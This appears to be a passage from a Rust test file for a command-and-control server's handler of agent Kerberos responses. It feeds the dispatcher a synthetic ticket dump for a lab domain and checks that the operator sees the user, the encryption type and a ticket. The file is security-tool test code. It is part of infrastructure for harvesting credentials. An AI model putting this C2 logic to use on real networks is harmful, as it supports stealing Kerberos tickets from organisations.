        add_utf16(&mut payload, "LAB.LOCAL");
        add_u32(&mut payload, 0xD53E_8000);
        add_u32(&mut payload, 0x019D_B1DE);
        add_u32(&mut payload, 0xD53E_8000);
        add_u32(&mut payload, 0x019D_B1DE);
        add_u32(&mut payload, 0xD53E_8000);
        add_u32(&mut payload, 0x019D_B1DE);
        add_u32(&mut payload, 18);
        add_u32(&mut payload, 0x4081_0000);
        add_bytes(&mut payload, b"ticket");

        dispatcher
            .dispatch(0x0102_0304, u32::from(DemonCommand::CommandKerberos), 9, &payload)
            .await?;

        let event = receiver.recv().await.ok_or_else(|| "kerberos response missing".to_owned())?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected kerberos agent response event");
        };
        assert!(message.info.output.contains("UserName                : alice"));
        assert!(message.info.output.contains("Encryption type : AES256_CTS_HMAC_SHA1"));
        assert!(message.info.output.contains("Ticket          : dGlja2V0"));
        Ok(())
    }

    fn add_u32(buf: &mut Vec<u8>, value: u32) {
        buf.extend_from_slice(&value.to_le_bytes());
    }

    fn add_u64(buf: &mut Vec<u8>, value: u64) {
        buf.extend_from_slice(&value.to_le_bytes());
    }

    fn add_bytes(buf: &mut Vec<u8>, value: &[u8]) {
        add_u32(buf, u32::try_from(value.len()).unwrap_or_default());
        buf.extend_from_slice(value);
    }

    fn add_utf16(buf: &mut Vec<u8>, value: &str) {
        let mut encoded: Vec<u8> = value.encode_utf16().flat_map(u16::to_le_bytes).collect();
        encoded.extend_from_slice(&[0, 0]);
        add_bytes(buf, &encoded);
    }
}
